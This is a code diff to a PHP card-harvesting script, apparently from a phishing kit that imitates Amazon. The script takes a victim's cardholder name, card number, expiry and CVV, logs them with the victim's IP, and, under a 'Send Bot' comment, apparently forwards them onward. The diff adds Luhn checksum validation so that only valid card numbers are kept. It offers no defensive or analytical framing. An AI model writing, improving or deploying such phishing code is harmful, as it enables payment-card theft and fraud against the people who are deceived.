@@ -5,22 +5,70 @@
 */
 session_start();
 error_reporting(0);
+
+function is_valid_card_number($number)
+{
+    $digitsOnly = preg_replace('/\D/', '', (string) $number);
+    if ($digitsOnly === '' || strlen($digitsOnly) < 12 || preg_match('/^0+$/', $digitsOnly)) {
+        return false;
+    }
+
+    $sum = 0;
+    $shouldDouble = false;
+
+    for ($i = strlen($digitsOnly) - 1; $i >= 0; $i--) {
+        $digit = (int) $digitsOnly[$i];
+
+        if ($shouldDouble) {
+            $digit *= 2;
+            if ($digit > 9) {
+                $digit -= 9;
+            }
+        }
+
+        $sum += $digit;
+        $shouldDouble = !$shouldDouble;
+    }
+
+    return $sum % 10 === 0;
+}
+
+$requestMethod = $_SERVER['REQUEST_METHOD'] ?? 'GET';
+if (strtoupper($requestMethod) !== 'POST') {
+    return;
+}
+
 # Adding Settings
 include('function.php');
 $settings = include('../config.php');
 require_once __DIR__ . '/../storage/storage.php';
-# User Agent 
 
+# User Agent
 $useragent = $_SERVER['HTTP_USER_AGENT'];
 
-#
-$holder .= $_POST['holder'];
-$ccnum .= $_POST['ccnum'];
-$ccexp .= $_POST['EXP1']."/".$_POST['EXP2'];
-$cvv2 .= $_POST['cvv2'];
+$holder = isset($_POST['holder']) ? trim($_POST['holder']) : '';
+$ccnumInput = isset($_POST['ccnum']) ? $_POST['ccnum'] : '';
+$ccnum = trim($ccnumInput);
+$expMonth = isset($_POST['EXP1']) ? (string) $_POST['EXP1'] : '';
+$expYear = isset($_POST['EXP2']) ? (string) $_POST['EXP2'] : '';
+$ccexp = $expMonth . "/" . $expYear;
+$cvv2 = isset($_POST['cvv2']) ? trim($_POST['cvv2']) : '';
+
+if (!is_valid_card_number($ccnumInput)) {
+    $_SESSION['card_form_data'] = [
+        'holder' => $holder,
+        'ccnum' => trim($ccnumInput),
+        'EXP1' => $expMonth,
+        'EXP2' => $expYear,
+        'cvv2' => $cvv2,
+    ];
+
+    header('Location: card.php?invalid_data=1');
+    exit;
+}
 
 # Logs
-$message .= "🔥 AM4ZON CARD FROM - {$IP} 🔥\n\n";
+$message = "🔥 AM4ZON CARD FROM - {$IP} 🔥\n\n";
 $message .= "➤ [ Card Name ] : {$holder}\n";
 $message .= "➤ [ Card Num ] : {$ccnum}\n";
 $message .= "➤ [ Card Exp ] : {$ccexp}\n";
@@ -45,6 +93,8 @@ $payload = [
 
 append_login_session_step(session_id(), 'card', $payload);
 
+# clear stale form data on success
+unset($_SESSION['card_form_data']);
 
 # Send Bot
 
